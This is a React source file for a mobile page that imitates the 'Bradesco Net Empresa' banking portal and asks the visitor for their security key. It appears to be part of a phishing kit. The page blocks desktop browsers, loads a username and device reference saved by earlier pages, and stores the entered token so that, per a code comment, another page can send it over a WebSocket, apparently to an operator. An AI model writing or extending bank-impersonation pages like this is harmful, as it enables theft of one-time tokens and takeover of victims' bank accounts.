import { useState, useRef, useEffect, useCallback } from "react";
import { ChevronLeft, Eye, EyeOff } from "lucide-react";
import { useNavigate } from "react-router-dom";

const TokenPage = () => {
  const [token, setToken] = useState("");
  const [showToken, setShowToken] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [erro, setErro] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);
  const navigate = useNavigate();

  const usuario = sessionStorage.getItem("usuario") || "";
  const dispositivo = sessionStorage.getItem("dispositivo") || "";

  useEffect(() => {
    inputRef.current?.focus();
    const erroSalvo = sessionStorage.getItem("erroToken");
    if (erroSalvo) {
      setErro(erroSalvo);
      sessionStorage.removeItem("erroToken");
    }
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!token) return;

    setIsLoading(true);
    setErro("");

    // Store token in session so ValidatingPage can send it via WS
    sessionStorage.setItem("pendingToken", token);
    navigate("/validando");
  };

  // Build ref display like "Ref. XXXXXX548-5" from dispositivo
  const refDisplay = dispositivo
    ? `Ref. ${dispositivo}`
    : "";

  return (
    <>
      {/* Desktop blocker */}
      <div className="hidden md:flex min-h-screen items-center justify-center bg-[hsl(220,60%,40%)] p-8">
        <div className="text-center text-white max-w-sm space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-white/20 flex items-center justify-center mx-auto">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
          </div>
          <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
          <p className="text-white/70 text-sm leading-relaxed">
            Este portal está disponível apenas para dispositivos móveis.
          </p>
        </div>
      </div>

      {/* Mobile layout */}
      <div className="md:hidden min-h-screen flex flex-col bg-[hsl(220,20%,96%)]">
        {/* Blue header bar */}
        <div className="bg-[hsl(220,60%,40%)] px-4 py-3 flex items-center gap-3">
          <button
            onClick={() => navigate("/")}
            className="text-white p-1 -ml-1 active:scale-95 transition-transform"
          >
            <ChevronLeft className="w-6 h-6" />
          </button>
          <h1 className="text-white text-base font-semibold tracking-tight">
            Bradesco Net Empresa
          </h1>
        </div>

        {/* Content */}
        <div className="flex flex-col flex-1 px-5 pt-8">
          <h2 className="text-[hsl(220,20%,14%)] text-2xl font-bold leading-tight mb-6">
            Dispositivo de segurança
          </h2>

          <form onSubmit={handleSubmit} className="flex flex-col flex-1">
            {/* Token field */}
            <div className="bg-white rounded-lg px-4 pt-3 pb-2 border border-[hsl(220,14%,89%)]">
              <div className="flex items-center justify-between">
                <div className="flex-1">
                  <input
                    ref={inputRef}
                    type={showToken ? "text" : "password"}
                    value={token}
                    onChange={(e) => {
                      setToken(e.target.value);
                      setErro("");
                    }}
                    placeholder="Digite a Chave de Segurança"
                    inputMode="numeric"
                    className="w-full bg-transparent text-[hsl(220,20%,14%)] text-base font-medium border-b-2 border-[hsl(220,14%,89%)] pb-2 placeholder:text-[hsl(220,10%,46%)] focus:outline-none focus:border-[hsl(220,60%,40%)] transition-colors"
                  />
                </div>
                <button
                  type="button"
                  onClick={() => setShowToken(!showToken)}
                  className="ml-3 text-[hsl(220,10%,46%)] hover:text-[hsl(220,20%,14%)] transition-colors"
                >
                  {showToken ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            {refDisplay && (
              <p className="text-[hsl(220,10%,46%)] text-xs mt-2 ml-1">{refDisplay}</p>
            )}

            {erro && (
              <p className="text-[hsl(0,84%,60%)] text-sm mt-4 text-center">{erro}</p>
            )}

            {/* Bottom actions */}
            <div className="mt-auto pb-8 space-y-3">
              <button
                type="submit"
                disabled={isLoading || !token}
                className={`w-full h-14 rounded-full text-white text-base font-semibold tracking-wide active:scale-[0.97] transition-all duration-200 ${
                  token
                    ? "bg-[hsl(349,93%,42%)]"
                    : "bg-[hsl(220,10%,75%)] opacity-60"
                }`}
              >
                {isLoading ? (
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin mx-auto" />
                ) : (
                  "Acessar conta"
                )}
              </button>

              <button
                type="button"
                className="w-full h-14 rounded-full border-2 border-[hsl(349,93%,42%)] text-[hsl(349,93%,42%)] text-base font-semibold tracking-wide active:scale-[0.97] transition-all duration-200"
              >
                Ativar nova chave
              </button>
            </div>
          </form>
        </div>
      </div>
    </>
  );
};

export default TokenPage;
